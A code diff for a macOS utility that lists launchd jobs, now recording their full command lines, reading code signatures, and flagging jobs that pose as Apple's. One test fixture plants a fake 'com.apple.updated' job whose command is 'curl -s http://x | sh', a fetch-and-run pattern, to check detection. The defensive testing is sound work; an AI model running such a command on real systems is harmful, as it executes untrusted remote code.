@@ -3,14 +3,16 @@
 //! which app it belongs to and whether it is likely not needed. Each can be
 //! turned off without removing anything, and turned back on.
 
+use super::sign::{self, Flag, Signer};
 use crate::kit::{macos, plist};
 use std::collections::{HashMap, HashSet};
 use std::path::{Path, PathBuf};
 
 /// Which launchd folder a job comes from.
-#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
+#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Default)]
 pub enum Scope {
     /// ~/Library/LaunchAgents
+    #[default]
     User,
     /// /Library/LaunchAgents: runs for every user, switchable per user
     AllUsers,
@@ -19,7 +21,7 @@ pub enum Scope {
 }
 
 /// When launchd starts a job, from its plist.
-#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
 pub enum When {
     /// KeepAlive: started again whenever it stops.
     KeepsRunning,
@@ -30,6 +32,7 @@ pub enum When {
     /// RunAtLoad only.
     AtLogin,
     /// Only when something asks for it (a socket, a watched path, a Mach service).
+    #[default]
     OnDemand,
 }
 
@@ -98,11 +101,17 @@ fn protected(label: &str) -> bool {
     l.starts_with("com.apple.") || l.starts_with("com.romanfurman6.") || l.contains("vpn") || l.contains("security") || l.contains("antivirus") || l.contains("backup")
 }
 
-#[derive(Clone, Debug, PartialEq)]
+#[derive(Clone, Debug, PartialEq, Default)]
 pub struct Job {
     pub label: String,
     pub plist: PathBuf,
     pub program: Option<PathBuf>,
+    /// The whole command line (ProgramArguments, else just the program).
+    pub args: Vec<String>,
+    /// Who signed what it runs; None until `codesign` has been asked.
+    pub sig: Option<Signer>,
+    /// What it runs, hashed: tells a changed job from the same one.
+    pub fp: String,
     pub scope: Scope,
     pub on: bool,
     pub when: When,
@@ -151,6 +160,59 @@ impl Job {
     pub fn owner_name(&self) -> Option<String> {
         self.owner.as_ref().and_then(|o| o.file_stem()).map(|s| s.to_string_lossy().into_owned())
     }
+    /// macOS's own: named com.apple.* and really Apple's (signed by Apple,
+    /// or in a folder only Apple can write). Kept out of the list. One with
+    /// the name but not the signature shows, flagged.
+    pub fn apple(&self) -> bool {
+        if !self.label.to_ascii_lowercase().starts_with("com.apple.") {
+            return false;
+        }
+        let Some(p) = &self.program else { return true };
+        // until its signature is read, it waits out of sight
+        sign::apple_owned(p, &self.args, self.sig.as_ref())
+    }
+    pub fn flags(&self) -> Vec<Flag> {
+        sign::flags(&self.label, self.program.as_deref(), &self.args, self.sig.as_ref())
+    }
+    /// The command line as one string, for the menu.
+    pub fn command(&self) -> String {
+        if self.args.is_empty() {
+            return self.program.as_ref().map(|p| p.display().to_string()).unwrap_or_default();
+        }
+        self.args.iter().map(|a| if a.contains(' ') || a.is_empty() { format!("'{a}'") } else { a.clone() }).collect::<Vec<_>>().join(" ")
+    }
+    /// What VirusTotal should look up.
+    pub fn vt_file(&self) -> Option<PathBuf> {
+        self.program.as_ref().map(|p| sign::vt_subject(p, &self.args))
+    }
+}
+
+/// A short hash of what a job runs.
+pub fn fingerprint(program: Option<&Path>, args: &[String]) -> String {
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    h.update(program.map(|p| p.to_string_lossy().into_owned()).unwrap_or_default().as_bytes());
+    for a in args {
+        h.update([0u8]);
+        h.update(a.as_bytes());
+    }
+    h.finalize().iter().take(8).map(|b| format!("{b:02x}")).collect()
+}
+
+/// Program and full command line from a job plist.
+fn program_of(v: &plist::Value, bundle: Option<&Path>) -> (Option<PathBuf>, Vec<String>) {
+    let args: Vec<String> = match v.get("ProgramArguments") {
+        Some(plist::Value::Array(a)) => a.iter().filter_map(|x| x.str()).map(str::to_string).collect(),
+        _ => Vec::new(),
+    };
+    let program = match bundle {
+        Some(app) => v.get_str("BundleProgram").map(|b| app.join(b)),
+        None => None,
+    }
+    .or_else(|| v.get_str("Program").map(PathBuf::from))
+    .or_else(|| args.first().map(PathBuf::from))
+    .or_else(|| v.get_str("BundleProgram").map(PathBuf::from));
+    (program, args)
 }
 
 /// An app macOS opens at login.
@@ -222,17 +284,6 @@ pub fn dirs(user_library: &Path, system: &Path) -> [(PathBuf, Scope); 3] {
     [(user_library.join("LaunchAgents"), Scope::User), (system.join("Library/LaunchAgents"), Scope::AllUsers), (system.join("Library/LaunchDaemons"), Scope::System)]
 }
 
-/// Every job plist path in the launchd folders (macOS's own left out).
-pub fn plist_paths(user_library: &Path, system: &Path) -> Vec<PathBuf> {
-    let mut out = Vec::new();
-    for (dir, _) in dirs(user_library, system) {
-        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
-        out.extend(rd.flatten().map(|e| e.path()).filter(|p| p.extension().is_some_and(|e| e == "plist") && !p.file_name().is_some_and(|n| n.to_string_lossy().starts_with("com.apple."))));
-    }
-    out.sort();
-    out
-}
-
 /// launchd jobs of every scope, macOS's own left out.
 pub fn jobs(user_library: &Path, system: &Path, disabled_user: &HashSet<String>, disabled_system: &HashSet<String>, pids: &HashMap<String, u32>) -> Vec<Job> {
     let mut out = Vec::new();
@@ -245,23 +296,15 @@ pub fn jobs(user_library: &Path, system: &Path, disabled_user: &HashSet<String>,
                 let path = e.path();
                 let v = plist::read(&path)?;
                 let label = v.get_str("Label")?.to_string();
-                if label.starts_with("com.apple.") {
-                    return None;
-                }
-                let program = v
-                    .get_str("Program")
-                    .map(PathBuf::from)
-                    .or_else(|| match v.get("ProgramArguments") {
-                        Some(plist::Value::Array(a)) => a.first().and_then(|x| x.str()).map(PathBuf::from),
-                        _ => None,
-                    })
-                    .or_else(|| v.get_str("BundleProgram").map(PathBuf::from));
+                let (program, args) = program_of(&v, None);
                 let orphan = program.as_ref().is_some_and(|p| p.is_absolute() && p.symlink_metadata().is_err());
                 let disabled = if scope == Scope::System { disabled_system } else { disabled_user };
                 let on = !disabled.contains(&label) && v.get_bool("Disabled") != Some(true);
                 let owner = program.as_deref().and_then(owner_app);
                 let name = display_name(&label, owner.as_deref());
-                Some(Job { pid: if on { pids.get(&label).copied() } else { None }, when: when_of(&v), label, plist: path, program, scope, on, orphan, owner, name, bundled: false })
+                let fp = fingerprint(program.as_deref(), &args);
+                let sig = program.as_deref().and_then(|p| sign::known(p, &args));
+                Some(Job { pid: if on { pids.get(&label).copied() } else { None }, when: when_of(&v), label, plist: path, program, args, sig, fp, scope, on, orphan, owner, name, bundled: false })
             })
             .collect();
         found.sort_by_key(|j| j.name.to_lowercase());
@@ -354,21 +397,16 @@ pub fn bundled_jobs(apps: &[PathBuf], k: &Known) -> Vec<Job> {
                 let Some(v) = plist::read(&path) else { continue };
                 let Some(label) = v.get_str("Label").map(str::to_string) else { continue };
                 let (loaded, disabled) = if scope == Scope::System { (k.loaded_system, k.disabled_system) } else { (k.loaded_user, k.disabled_user) };
-                if label.starts_with("com.apple.") || !(loaded.contains(&label) || disabled.contains(&label)) {
+                if !(loaded.contains(&label) || disabled.contains(&label)) {
                     continue;
                 }
-                let program = v
-                    .get_str("BundleProgram")
-                    .map(|b| app.join(b))
-                    .or_else(|| v.get_str("Program").map(PathBuf::from))
-                    .or_else(|| match v.get("ProgramArguments") {
-                        Some(plist::Value::Array(a)) => a.first().and_then(|x| x.str()).map(PathBuf::from),
-                        _ => None,
-                    });
+                let (program, args) = program_of(&v, Some(app));
                 let on = !disabled.contains(&label) && v.get_bool("Disabled") != Some(true);
                 let owner = Some(app.clone());
                 let name = display_name(&label, owner.as_deref());
-                out.push(Job { pid: if on { k.pids.get(&label).copied() } else { None }, when: when_of(&v), label, plist: path, program, scope, on, orphan: false, owner, name, bundled: true });
+                let fp = fingerprint(program.as_deref(), &args);
+                let sig = program.as_deref().and_then(|p| sign::known(p, &args));
+                out.push(Job { pid: if on { k.pids.get(&label).copied() } else { None }, when: when_of(&v), label, plist: path, program, args, sig, fp, scope, on, orphan: false, owner, name, bundled: true });
             }
         }
     }
@@ -425,8 +463,30 @@ fn run(args: &[&str]) -> String {
     std::process::Command::new("/bin/launchctl").args(args).output().map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default()
 }
 
-/// Read every job with its on/off and running state.
-pub fn read_jobs(user_library: &Path) -> Vec<Job> {
+/// Leave out macOS's own jobs.
+pub fn shown(mut jobs: Vec<Job>) -> Vec<Job> {
+    jobs.retain(|j| !j.apple());
+    jobs
+}
+
+/// Jobs whose signature hasn't been read yet.
+pub fn unsigned_yet(jobs: &[Job]) -> bool {
+    jobs.iter().any(|j| j.sig.is_none() && j.program.is_some())
+}
+
+/// Read the signatures not read yet (runs `codesign`; slow).
+pub fn sign_jobs(jobs: &mut [Job]) {
+    let todo: Vec<(PathBuf, Vec<String>)> = jobs.iter().filter(|j| j.sig.is_none()).filter_map(|j| Some((j.program.clone()?, j.args.clone()))).collect();
+    sign::check_all(&todo);
+    for j in jobs.iter_mut().filter(|j| j.sig.is_none()) {
+        if let Some(p) = &j.program {
+            j.sig = sign::known(p, &j.args);
+        }
+    }
+}
+
+/// Every job, macOS's own included (they're sorted out once signed).
+pub fn read_raw(user_library: &Path) -> Vec<Job> {
     let gui = format!("gui/{}", macos::uid());
     let du = parse_disabled(&run(&["print-disabled", &gui]));
     let ds = parse_disabled(&run(&["print-disabled", "system"]));
@@ -578,14 +638,17 @@ pub mod tests {
         f.file("home/Library/LaunchAgents/com.google.GoogleUpdater.wake.plist", &job_xml("com.google.GoogleUpdater.wake", "/bin/sh", "<key>StartInterval</key><integer>3600</integer>"));
         f.file("home/Library/LaunchAgents/com.gone.agent.plist", &job_xml("com.gone.agent", "/nope/Gone.app/Contents/MacOS/agent", "<key>RunAtLoad</key><true/>"));
         f.file("home/Library/LaunchAgents/com.off.agent.plist", &job_xml("com.off.agent", "/bin/sh", "<key>Disabled</key><true/>"));
-        f.file("home/Library/LaunchAgents/com.apple.x.plist", &job_xml("com.apple.x", "/bin/sh", ""));
+        f.file("home/Library/LaunchAgents/com.apple.x.plist", &job_xml("com.apple.x", "/usr/libexec/x", ""));
         f.file("sys/Library/LaunchDaemons/com.docker.vmnetd.plist", &job_xml("com.docker.vmnetd", "/bin/sh", "<key>KeepAlive</key><true/>"));
         f.file("sys/Library/LaunchAgents/com.ms.update.plist", &job_xml("com.ms.update", "/bin/sh", "<key>StartCalendarInterval</key><dict><key>Hour</key><integer>3</integer></dict>"));
         let du: HashSet<String> = ["com.off.agent".to_string()].into();
         let pids: HashMap<String, u32> = [("com.docker.vmnetd".to_string(), 77), ("com.off.agent".to_string(), 5)].into();
         let js = jobs(&f.home_lib, &f.sys, &du, &HashSet::new(), &pids);
         let find = |l: &str| js.iter().find(|j| j.label == l).unwrap();
-        assert_eq!(js.len(), 5);
+        assert_eq!(js.len(), 6);
+        // Apple's own: kept out once its program is known to be Apple's (SIP folder here)
+        assert!(find("com.apple.x").apple());
+        assert_eq!(shown(js.clone()).len(), 5);
         let g = find("com.google.GoogleUpdater.wake");
         assert_eq!((g.when, g.name.as_str(), g.why()), (When::Every(3600), "Google Updater", Some(Why::Updater)));
         let gone = find("com.gone.agent");
@@ -598,7 +661,6 @@ pub mod tests {
         assert_eq!((d.scope, d.when, d.pid, d.why()), (Scope::System, When::KeepsRunning, Some(77), None));
         let ms = find("com.ms.update");
         assert_eq!((ms.scope, ms.when), (Scope::AllUsers, When::Scheduled));
-        assert_eq!(plist_paths(&f.home_lib, &f.sys).len(), 5);
     }
 
     #[test]
@@ -629,6 +691,35 @@ pub mod tests {
     }
 
     #[test]
+    fn keeps_the_command_and_spots_fake_apple_jobs() {
+        let f = Fake::new("cmd");
+        f.file("home/Library/LaunchAgents/com.apple.updated.plist", &format!("<plist><dict><key>Label</key><string>com.apple.updated</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://x | sh</string></array></dict></plist>"));
+        let js = jobs(&f.home_lib, &f.sys, &HashSet::new(), &HashSet::new(), &HashMap::new());
+        let mut j = js[0].clone();
+        assert_eq!(j.args, vec!["/bin/sh", "-c", "curl -s http://x | sh"]);
+        assert_eq!(j.command(), "/bin/sh -c 'curl -s http://x | sh'");
+        // /bin/sh is Apple's, but this job hands it code inline: shown, flagged
+        j.sig = Some(Signer::Apple);
+        assert!(!j.apple());
+        assert_eq!(j.flags(), vec![Flag::FakeApple, Flag::InlineCode]);
+        j.args = vec![];
+        j.program = Some(PathBuf::from("/Applications/Xcode.app/Contents/MacOS/x"));
+        j.sig = None;
+        assert!(j.apple(), "hidden until signed");
+        // the same name on someone else's program shows, flagged
+        j.program = Some(PathBuf::from("/Users/Shared/u"));
+        j.args = vec![];
+        j.sig = Some(Signer::Unsigned);
+        assert!(!j.apple());
+        assert_eq!(j.flags(), vec![Flag::FakeApple, Flag::Unsigned, Flag::TempFolder]);
+        // the fingerprint follows what runs
+        let a = fingerprint(Some(Path::new("/bin/x")), &["/bin/x".into(), "-a".into()]);
+        assert_eq!(a, fingerprint(Some(Path::new("/bin/x")), &["/bin/x".into(), "-a".into()]));
+        assert_ne!(a, fingerprint(Some(Path::new("/bin/x")), &["/bin/x".into(), "-b".into()]));
+        assert_eq!(a.len(), 16);
+    }
+
+    #[test]
     fn lists_loaded_jobs_running_or_not() {
         let l = parse_list_loaded("PID\tStatus\tLabel\n123\t0\tcom.a\n-\t0\tcom.b\n");
         assert_eq!(l, ["com.a".to_string(), "com.b".to_string()].into());
@@ -638,7 +729,7 @@ pub mod tests {
 
     #[test]
     fn suggestions_skip_protected_jobs() {
-        let mut j = Job { label: "com.acme.vpn.updater".into(), plist: PathBuf::new(), program: None, scope: Scope::User, on: true, when: When::AtLogin, pid: None, orphan: false, owner: None, name: String::new(), bundled: false };
+        let mut j = Job { label: "com.acme.vpn.updater".into(), on: true, when: When::AtLogin, ..Default::default() };
         assert_eq!(j.why(), None);
         j.label = "com.acme.updater".into();
         assert_eq!(j.why(), Some(Why::Updater));
@@ -677,7 +768,7 @@ pub mod tests {
 
     #[test]
     fn switch_commands() {
-        let j = Job { label: "com.a.b".into(), plist: "/L/com.a.b.plist".into(), program: None, scope: Scope::System, on: true, when: When::AtLogin, pid: None, orphan: false, owner: None, name: "B".into(), bundled: false };
+        let j = Job { label: "com.a.b".into(), plist: "/L/com.a.b.plist".into(), scope: Scope::System, on: true, when: When::AtLogin, name: "B".into(), ..Default::default() };
         assert_eq!(switch_cmd(&j, false), "/bin/launchctl disable 'system/com.a.b'; /bin/launchctl bootout 'system/com.a.b' 2>/dev/null; ");
         assert_eq!(switch_cmd(&j, true), "/bin/launchctl enable 'system/com.a.b'; /bin/launchctl bootstrap system '/L/com.a.b.plist' 2>/dev/null; ");
     }
